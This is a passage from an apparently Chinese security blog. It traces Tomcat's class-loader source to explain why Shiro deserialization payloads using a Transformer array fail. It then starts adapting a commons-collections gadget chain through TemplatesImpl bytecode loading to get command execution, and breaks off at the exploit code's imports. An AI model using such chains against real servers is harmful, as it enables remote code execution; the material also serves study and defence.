<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boolean delegateLoad = delegate || filter(name, true);</span><br></pre></td></tr></table></figure></div>

<p>的结果为真则会先调用父类加载器进行加载，走双亲委派模型，也就是调用 Class.forName，如果结果为false则不走双亲委派模型，先调用自己的类加载器也就是调用findclass，如果加载不到才会调用父类加载器。</p>
<p>我们这里跟进到filter分析一下判断机制</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">protected boolean filter(String name, boolean isClassName) &#123;</span><br><span class="line"></span><br><span class="line">        if (name == null)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        char ch;</span><br><span class="line">        if (name.startsWith(&quot;javax&quot;)) &#123;</span><br><span class="line">            /* 5 == length(&quot;javax&quot;) */</span><br><span class="line">            if (name.length() == 5) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            ch = name.charAt(5);</span><br><span class="line">            if (isClassName &amp;&amp; ch == &#x27;.&#x27;) &#123;</span><br><span class="line">                /* 6 == length(&quot;javax.&quot;) */</span><br><span class="line">                if (name.startsWith(&quot;servlet.jsp.jstl.&quot;, 6)) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                if (name.startsWith(&quot;el.&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;servlet.&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;websocket.&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;security.auth.message.&quot;, 6)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else if (!isClassName &amp;&amp; ch == &#x27;/&#x27;) &#123;</span><br><span class="line">                /* 6 == length(&quot;javax/&quot;) */</span><br><span class="line">                if (name.startsWith(&quot;servlet/jsp/jstl/&quot;, 6)) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                if (name.startsWith(&quot;el/&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;servlet/&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;websocket/&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;security/auth/message/&quot;, 6)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (name.startsWith(&quot;org&quot;)) &#123;</span><br><span class="line">            /* 3 == length(&quot;org&quot;) */</span><br><span class="line">            if (name.length() == 3) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            ch = name.charAt(3);</span><br><span class="line">            if (isClassName &amp;&amp; ch == &#x27;.&#x27;) &#123;</span><br><span class="line">                /* 4 == length(&quot;org.&quot;) */</span><br><span class="line">                if (name.startsWith(&quot;apache.&quot;, 4)) &#123;</span><br><span class="line">                    /* 11 == length(&quot;org.apache.&quot;) */</span><br><span class="line">                    if (name.startsWith(&quot;tomcat.jdbc.&quot;, 11)) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (name.startsWith(&quot;el.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;catalina.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;jasper.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;juli.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;tomcat.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;naming.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;coyote.&quot;, 11)) &#123;</span><br><span class="line">                        return true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else if (!isClassName &amp;&amp; ch == &#x27;/&#x27;) &#123;</span><br><span class="line">                /* 4 == length(&quot;org/&quot;) */</span><br><span class="line">                if (name.startsWith(&quot;apache/&quot;, 4)) &#123;</span><br><span class="line">                    /* 11 == length(&quot;org/apache/&quot;) */</span><br><span class="line">                    if (name.startsWith(&quot;tomcat/jdbc/&quot;, 11)) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (name.startsWith(&quot;el/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;catalina/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;jasper/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;juli/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;tomcat/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;naming/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;coyote/&quot;, 11)) &#123;</span><br><span class="line">                        return true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>然后这里根据分析代码和网上一些师傅的文章</p>
<p>如果这里不是tomcat自己的lib或者classes类的话是可以加载成功的，也就是返回结果为真，调用Class.forName进行加载</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013194754937.png"
                      alt="image-20231013194754937"
                ></p>
<p>但是我们要加载的commons-collections类明显是在tomcat下面的web-INF lib下面也就是用webappclassloader进行加载</p>
<p>所以这里 filter返回的结果是为假的</p>
<p>所以也就是说这里是不走双亲委派机制的，先调用自己的类加载器，也就是调用findclass进行加载，然后在调用父类的class.forname进行加载。</p>
<p>所以这里也就是调用findclass进行加载</p>
<p>我们这里跟进到findclass分析一些：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        if (log.isDebugEnabled())</span><br><span class="line">            log.debug(&quot;    findClass(&quot; + name + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">        checkStateForClassLoading(name);</span><br><span class="line"></span><br><span class="line">        // (1) Permission to define this class when using a SecurityManager</span><br><span class="line">        if (securityManager != null) &#123;</span><br><span class="line">            int i = name.lastIndexOf(&#x27;.&#x27;);</span><br><span class="line">            if (i &gt;= 0) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (log.isTraceEnabled())</span><br><span class="line">                        log.trace(&quot;      securityManager.checkPackageDefinition&quot;);</span><br><span class="line">                    securityManager.checkPackageDefinition(name.substring(0,i));</span><br><span class="line">                &#125; catch (Exception se) &#123;</span><br><span class="line">                    if (log.isTraceEnabled())</span><br><span class="line">                        log.trace(&quot;      --&gt;Exception--&gt;ClassNotFoundException&quot;, se);</span><br><span class="line">                    throw new ClassNotFoundException(name, se);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Ask our superclass to locate this class, if possible</span><br><span class="line">        // (throws ClassNotFoundException if it is not found)</span><br><span class="line">        Class&lt;?&gt; clazz = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (log.isTraceEnabled())</span><br><span class="line">                log.trace(&quot;      findClassInternal(&quot; + name + &quot;)&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                if (securityManager != null) &#123;</span><br><span class="line">                    PrivilegedAction&lt;Class&lt;?&gt;&gt; dp =</span><br><span class="line">                        new PrivilegedFindClassByName(name);</span><br><span class="line">                    clazz = AccessController.doPrivileged(dp);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    clazz = findClassInternal(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch(AccessControlException ace) &#123;</span><br><span class="line">                log.warn(sm.getString(&quot;webappClassLoader.securityException&quot;, name,</span><br><span class="line">                        ace.getMessage()), ace);</span><br><span class="line">                throw new ClassNotFoundException(name, ace);</span><br><span class="line">            &#125; catch (RuntimeException e) &#123;</span><br><span class="line">                if (log.isTraceEnabled())</span><br><span class="line">                    log.trace(&quot;      --&gt;RuntimeException Rethrown&quot;, e);</span><br><span class="line">                throw e;</span><br><span class="line">            &#125;</span><br><span class="line">            if ((clazz == null) &amp;&amp; hasExternalRepositories) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    clazz = super.findClass(name);</span><br><span class="line">                &#125; catch(AccessControlException ace) &#123;</span><br><span class="line">                    log.warn(sm.getString(&quot;webappClassLoader.securityException&quot;, name,</span><br><span class="line">                            ace.getMessage()), ace);</span><br><span class="line">                    throw new ClassNotFoundException(name, ace);</span><br><span class="line">                &#125; catch (RuntimeException e) &#123;</span><br><span class="line">                    if (log.isTraceEnabled())</span><br><span class="line">                        log.trace(&quot;      --&gt;RuntimeException Rethrown&quot;, e);</span><br><span class="line">                    throw e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (clazz == null) &#123;</span><br><span class="line">                if (log.isDebugEnabled())</span><br><span class="line">                    log.debug(&quot;    --&gt; Returning ClassNotFoundException&quot;);</span><br><span class="line">                throw new ClassNotFoundException(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            if (log.isTraceEnabled())</span><br><span class="line">                log.trace(&quot;    --&gt; Passing on ClassNotFoundException&quot;);</span><br><span class="line">            throw e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Return the class we have located</span><br><span class="line">        if (log.isTraceEnabled())</span><br><span class="line">            log.debug(&quot;      Returning class &quot; + clazz);</span><br><span class="line"></span><br><span class="line">        if (log.isTraceEnabled()) &#123;</span><br><span class="line">            ClassLoader cl;</span><br><span class="line">            if (Globals.IS_SECURITY_ENABLED)&#123;</span><br><span class="line">                cl = AccessController.doPrivileged(</span><br><span class="line">                    new PrivilegedGetClassLoader(clazz));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                cl = clazz.getClassLoader();</span><br><span class="line">            &#125;</span><br><span class="line">            log.debug(&quot;      Loaded by &quot; + cl.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        return clazz;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们对上面的代码进行分析可以知道调用<code>findClassInternal(name)</code>这是自定义类加载器的一个内部方法，尝试查找和加载指定名称的类。其实也就是调用自己的类加载方法进行加载。</p>
<p>如果前面无法加载类，代码会尝试通过 <code>super.findClass(name)</code> 来委托给父类加载器加载类。这也是为了确保加载的一致性，符合类加载的双亲委派模型。</p>
<p>我们这里跟进到findClassInternal(name)方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; findClassInternal(String name) &#123;</span><br><span class="line"></span><br><span class="line">    checkStateForResourceLoading(name);</span><br><span class="line"></span><br><span class="line">    if (name == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    String path = binaryNameToPath(name, true);</span><br><span class="line"></span><br><span class="line">    ResourceEntry entry = resourceEntries.get(path);</span><br><span class="line">    WebResource resource = null;</span><br><span class="line"></span><br><span class="line">    if (entry == null) &#123;</span><br><span class="line">        resource = resources.getClassLoaderResource(path);</span><br><span class="line"></span><br><span class="line">        if (!resource.exists()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        entry = new ResourceEntry();</span><br><span class="line">        entry.lastModified = resource.getLastModified();</span><br><span class="line"></span><br><span class="line">        // Add the entry in the local resource repository</span><br><span class="line">        synchronized (resourceEntries) &#123;</span><br><span class="line">            // Ensures that all the threads which may be in a race to load</span><br><span class="line">            // a particular class all end up with the same ResourceEntry</span><br><span class="line">            // instance</span><br><span class="line">            ResourceEntry entry2 = resourceEntries.get(path);</span><br><span class="line">            if (entry2 == null) &#123;</span><br><span class="line">                resourceEntries.put(path, entry);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                entry = entry2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = entry.loadedClass;</span><br><span class="line">    if (clazz != null)</span><br><span class="line">        return clazz;</span><br><span class="line"></span><br><span class="line">    synchronized (getClassLoadingLock(name)) &#123;</span><br><span class="line">        clazz = entry.loadedClass;</span><br><span class="line">        if (clazz != null)</span><br><span class="line">            return clazz;</span><br><span class="line"></span><br><span class="line">        if (resource == null) &#123;</span><br><span class="line">            resource = resources.getClassLoaderResource(path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!resource.exists()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        byte[] binaryContent = resource.getContent();</span><br><span class="line">        if (binaryContent == null) &#123;</span><br><span class="line">            // Something went wrong reading the class bytes (and will have</span><br><span class="line">            // been logged at debug level).</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        Manifest manifest = resource.getManifest();</span><br><span class="line">        URL codeBase = resource.getCodeBase();</span><br><span class="line">        Certificate[] certificates = resource.getCertificates();</span><br><span class="line"></span><br><span class="line">        if (transformers.size() &gt; 0) &#123;</span><br><span class="line">            // If the resource is a class just being loaded, decorate it</span><br><span class="line">            // with any attached transformers</span><br><span class="line"></span><br><span class="line">            // Ignore leading &#x27;/&#x27; and trailing CLASS_FILE_SUFFIX</span><br><span class="line">            // Should be cheaper than replacing &#x27;.&#x27; by &#x27;/&#x27; in class name.</span><br><span class="line">            String internalName = path.substring(1, path.length() - CLASS_FILE_SUFFIX.length());</span><br><span class="line"></span><br><span class="line">            for (ClassFileTransformer transformer : this.transformers) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    byte[] transformed = transformer.transform(</span><br><span class="line">                            this, internalName, null, null, binaryContent);</span><br><span class="line">                    if (transformed != null) &#123;</span><br><span class="line">                        binaryContent = transformed;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (IllegalClassFormatException e) &#123;</span><br><span class="line">                    log.error(sm.getString(&quot;webappClassLoader.transformError&quot;, name), e);</span><br><span class="line">                    return null;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Looking up the package</span><br><span class="line">        String packageName = null;</span><br><span class="line">        int pos = name.lastIndexOf(&#x27;.&#x27;);</span><br><span class="line">        if (pos != -1)</span><br><span class="line">            packageName = name.substring(0, pos);</span><br><span class="line"></span><br><span class="line">        Package pkg = null;</span><br><span class="line"></span><br><span class="line">        if (packageName != null) &#123;</span><br><span class="line">            pkg = getPackage(packageName);</span><br><span class="line">            // Define the package (if null)</span><br><span class="line">            if (pkg == null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (manifest == null) &#123;</span><br><span class="line">                        definePackage(packageName, null, null, null, null, null, null, null);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        definePackage(packageName, manifest, codeBase);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (IllegalArgumentException e) &#123;</span><br><span class="line">                    // Ignore: normal error due to dual definition of package</span><br><span class="line">                &#125;</span><br><span class="line">                pkg = getPackage(packageName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (securityManager != null) &#123;</span><br><span class="line"></span><br><span class="line">            // Checking sealing</span><br><span class="line">            if (pkg != null) &#123;</span><br><span class="line">                boolean sealCheck = true;</span><br><span class="line">                if (pkg.isSealed()) &#123;</span><br><span class="line">                    sealCheck = pkg.isSealed(codeBase);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    sealCheck = (manifest == null) || !isPackageSealed(packageName, manifest);</span><br><span class="line">                &#125;</span><br><span class="line">                if (!sealCheck)</span><br><span class="line">                    throw new SecurityException</span><br><span class="line">                        (&quot;Sealing violation loading &quot; + name + &quot; : Package &quot;</span><br><span class="line">                         + packageName + &quot; is sealed.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            clazz = defineClass(name, binaryContent, 0,</span><br><span class="line">                    binaryContent.length, new CodeSource(codeBase, certificates));</span><br><span class="line">        &#125; catch (UnsupportedClassVersionError ucve) &#123;</span><br><span class="line">            throw new UnsupportedClassVersionError(</span><br><span class="line">                    ucve.getLocalizedMessage() + &quot; &quot; +</span><br><span class="line">                    sm.getString(&quot;webappClassLoader.wrongVersion&quot;,</span><br><span class="line">                            name));</span><br><span class="line">        &#125;</span><br><span class="line">        entry.loadedClass = clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们跟进调试一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013212846905.png"
                      alt="image-20231013212846905"
                ></p>
<p>可以看到在findClassInternal中会调用 binaryNameToPath()方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String path = binaryNameToPath(name, true);：</span><br><span class="line">代码将类名转换为一个路径，通常用于定位类文件的资源路径。这可能会涉及到将类名中的包名分隔符（&quot;.&quot;）替换为文件路径分隔符（&quot;/&quot;）。</span><br></pre></td></tr></table></figure></div>

<p>那么binaryNameToPath()主要就是将类名转换为一个路径</p>
<p>我们跟进到这个方法里面看一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013212804709.png"
                      alt="image-20231013212804709"
                ></p>
<p>可以看到在转换的过程中，这个方法在原来的类名后面加了一个.class</p>
<p>那么最终查找的类的路径变为了&#x2F;[Lorg&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer;.class</p>
<p>但是我们可以看一下日志信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013213313733.png"
                      alt="image-20231013213313733"
                ></p>
<p>在我们日志中打印了我们要加载的类是&#x2F;[Lorg&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer;，但是在经过binaryNameToPath()方法转换后在末尾加了一个.class，这导致tomcat在调用自己的类加载器方法在web-INF进行查找加载的时候无法加载成功，因为根据binaryNameToPath转换的路径根本没有办法正常查找到类进行加载。</p>
<p>那么我们上面说了当tomcat自己的类加载器无法加载成功的时候，会调用父类加载器进行加载也就是class.forName，但是我们要加载类在tomcat的自己的类，也就是web-INF里面的类，这导致classforName是无法加载成功的。</p>
<p>这也就导致了shiro无法正常加载transform数组的原因。</p>
<p>那么根据我们上面的分析和对一些师傅文章的学习，我们大概可以得到一个结论如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。关于这个结论我们根据上面的分析也就很好理解了。tomcat的类加载机制导致先调用自身的类加载器进行加载，也就是调用findclass，但是在binaryNameToPath()转换下在末尾添加了一个.class，导致类加载器在web—INF中加载不到。但是如果是java自身数组，也就是jdk里面的，那么可以通过classforname也就是通过classloader进行加载，这样是可以正常加载的。</p>
<h1 id="三、CC链改装"><a href="#三、CC链改装" class="headerlink" title="三、CC链改装"></a>三、CC链改装</h1><p>上面我们分析了shiro为什么无法正常打CC依赖的原因，也就是使用了transform数组，那我们想要正常的打cc依赖，就要在构造POC的时候不使用transform数组。那我们就需要改装我们的CC链：</p>
<p>那我们这里的最终目的就是构造一个不需要使用transform数组的利用链，我们这里先看一下我们前面分析的几条CC链：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017163330119.png"
                      alt="image-20231017163330119"
                ></p>
<p>根据上面这个利用链图我们可以知道最终执行命令的就两种方法，一种是直接runtime进行命令执行，另一种就是动态加载字节码</p>
<p>但是如果我们要使用runtime进行命令执行的话，在我们前面分析的几条链中，都会使用到invokertransfrom，那这样必然会用到transform数组。</p>
<p>所以我们这里可以使用动态加载字节码来来进行利用：</p>
<p>那我们这里先回忆一下利用TemplatesIMPI加载字节码的利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses()-&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></div>

<p>然后我们这里CC2中是通invokerTransformer的transform方法去调用TemplatesImpl的newTransform方法进而调用后续利用链</p>
<p>事实上我们在前面分析的CC2的第二条链中就是没有使用到transform数组。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import 